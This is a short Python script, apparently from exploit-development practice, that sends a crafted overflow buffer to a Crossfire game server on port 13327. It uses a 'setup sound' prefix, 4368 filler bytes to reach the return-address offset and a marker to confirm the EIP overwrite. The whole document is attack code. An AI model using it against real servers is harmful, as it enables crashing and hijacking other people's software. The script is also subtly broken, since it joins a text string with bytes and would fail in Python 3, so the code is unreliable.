#!/usr/bin/python3

# This program is written to verify the correct overriding of EIP 
# for Crossfire BOF


import socket

host='192.168.56.110'

buffer = ''
buffer += b'\x11(setup sound '
buffer += b'A' * 4368        # Setoff of EIP  
buffer += b'B'*4             # EIP position
buffer += b'C'*(4379-4368-4)
buffer += b'\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print('Sending evil buffer...')
s.connect((host, 13327))
data=s.recv(1024)
s.send(buffer)
s.close()
print('Payload Sent')

